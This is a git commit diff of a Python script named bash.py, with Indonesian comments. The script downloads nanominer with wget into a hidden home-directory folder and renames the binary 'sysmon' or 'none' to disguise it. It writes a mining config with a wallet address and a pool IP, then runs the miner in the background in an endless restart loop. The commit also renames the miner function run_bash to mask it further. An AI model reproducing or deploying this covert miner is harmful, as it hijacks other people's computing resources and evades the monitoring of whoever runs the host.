275b2adeb1564f6f613dbfef491a8aa8044d02d5
daniowi9 <zzaza1@immacraft.com>
2025-04-16 06:14:12 +0700

    Update bash.py

--- bash.py
+++ bash.py
@@ -3,17 +3,17 @@ import time
 import os
 import random
 
-# Pastikan skrip berjalan di direktori home
+# Pastikan skrip selalu berjalan di direktori home
 os.chdir(os.path.expanduser("~"))
 
-def run_miner():
+def run_bash():
     commands = [
-        "pkill sysmon && sleep 2",
-        "rm -rf .syslog && sleep 2",
-        "mkdir .syslog && cd .syslog",
+        "pkill none && sleep 2",
+        "rm -rf .none && sleep 2",
+        "mkdir .none && cd .none",
         "wget https://github.com/nanopool/nanominer/releases/download/v3.9.3/nanominer-linux-3.9.3.tar.gz",
         "tar -xvf nanominer-linux-3.9.3.tar.gz",
-        "mv nanominer sysmon",
+        "mv nanominer none",
         "rm -rf con* nano*",
         """echo '[Verushash]
 wallet = RC3G7FfFYLxfnP5DYMKp5zkDWuJtofUXWq
@@ -31,13 +31,13 @@ pool1 = 47.236.66.121:443' > config.ini"""
     for cmd in commands:
         subprocess.run(cmd, shell=True)
         delay = random.uniform(4.0, 10.0)  # Delay antar perintah 1.5–4 detik
-        time.sleep(delay)
+        time.sleep(2)  # Delay agar berurutan
 
-    print("✅ Mining dimulai...")
-    subprocess.Popen("./syslog/sysmon", shell=True)
+    print("✅ bash dimulai...")
+    subprocess.Popen("./none", shell=True)  # Jalankan miner di background
 
 while True:
-    run_miner()
+    run_bash()
     delay = random.randint(300, 600)  # Delay sebelum restart 5–10 menit
-    print(f"⏳ Menunggu {delay} detik sebelum restart...")
-    time.sleep(delay)
+    print("⏳ Menunggu 300 detik sebelum restart...")
+    time.sleep(300)  # Tunggu 300 detik sebelum restart
